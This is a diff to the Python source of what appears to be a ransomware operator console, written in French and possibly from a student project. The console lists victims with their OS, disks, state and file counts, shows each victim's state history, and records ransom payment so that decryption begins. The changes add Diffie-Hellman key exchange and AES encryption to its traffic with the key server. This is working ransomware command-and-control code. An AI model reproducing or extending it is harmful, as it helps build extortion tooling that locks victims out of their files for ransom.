@@ -2,14 +2,14 @@ import socket
 from datetime import datetime
 import utile.network as network
 import utile.message as message
-'''import utile.security as security
-import utile.config as config
-import utile.input as my_input'''
+import utile.security as security
+#import utile.config as config
+#import utile.input as my_input
 
 
 # Constantes
 IP_SERV_CONSOLE = socket.gethostname()
-PORT_SERV_CONSOLE = 8381
+PORT_SERV_CONSOLE = 8380
 
 
 def format_timestamp(timestamp):
@@ -40,9 +40,11 @@ def affichage_liste_victimes():
     print("============================================================================")
     # Envoi de la requête
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    key = security.diffie_hellman_send_key(s)
+    print(f"Clé de chiffrement envoyée : {key}")
     msg = message.set_message("LIST_VICTIM_REQ")
-    network.send_message(s, msg)
-    # recevoir la réponse
+    encrypted_msg = security.aes_encrypt(msg, key)
+    network.send_message(s, encrypted_msg)
     response = network.receive_message(s)
     if response is None:
         print("Aucune réponse reçue.")
@@ -53,6 +55,13 @@ def affichage_liste_victimes():
         print(
             f"ID : {data[0]} | OS: {data[1]} | Disks: {data[2]} | State: {data[3]} | Nb_files: {data[4]}")
         response = network.receive_message(s)
+    #deconnexion
+    s.close()
+    #Verifie si bien fermé
+    if s._closed:
+        print("Connexion fermée avec le serveur.")
+    else:
+        print("Erreur lors de la fermeture de la connexion avec le serveur.")
 
 
 def affichage_historique_etat_victime():
@@ -62,12 +71,16 @@ def affichage_historique_etat_victime():
     print("============================================================================")
     # Connexion au serveur
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    key = security.diffie_hellman_send_key(s)
     # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
     # Envoi de la requête
     msg = message.set_message("HISTORY_REQ")
-    network.send_message(s, msg)
-    network.send_message(s, victim_id)
+    encrypted_msg = security.aes_encrypt(msg, key)
+    network.send_message(s, encrypted_msg)
+    encrypted_id = security.aes_encrypt(victim_id, key)
+    network.send_message(s, encrypted_id)
+
     # Récupération de la réponse
     response = network.receive_message(s)
     if response is None:
@@ -79,6 +92,13 @@ def affichage_historique_etat_victime():
         print(
             f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
         response = network.receive_message(s)
+    # deconnexion
+    s.close()
+    # Verifie si bien fermé
+    if s._closed:
+        print("Connexion fermée avec le serveur.")
+    else:
+        print("Erreur lors de la fermeture de la connexion avec le serveur.")
 
 
 def affichage_payement_rancon():
@@ -88,12 +108,15 @@ def affichage_payement_rancon():
     print("______________________________________________")
     # Connexion au serveur
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    key = security.diffie_hellman_send_key(s)
     # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
     # Envoi de la requête
     msg = message.set_message("CHANGE_STATE")
-    network.send_message(s, msg)
-    network.send_message(s, victim_id)
+    encrypted_msg = security.aes_encrypt(msg, key)
+    network.send_message(s, encrypted_msg)
+    encrypted_id = security.aes_encrypt(victim_id, key)
+    network.send_message(s, encrypted_id)
     # Récupération de la réponse
     response = network.receive_message(s)
     if response is None:
@@ -107,7 +130,13 @@ def affichage_payement_rancon():
         print(f"La victime {victim_id} a déja payé et est en cours de décryptage.")
     else:
         print(f"La victime {victim_id} est dans l'état {chgstate_value} et donc nous ne pouvons pas la décrypter.")
-
+    # deconnexion
+    s.close()
+    # Verifie si bien fermé
+    if s._closed:
+        print("Connexion fermée avec le serveur.")
+    else:
+        print("Erreur lors de la fermeture de la connexion avec le serveur.")
 
 def main():
     continuer = True
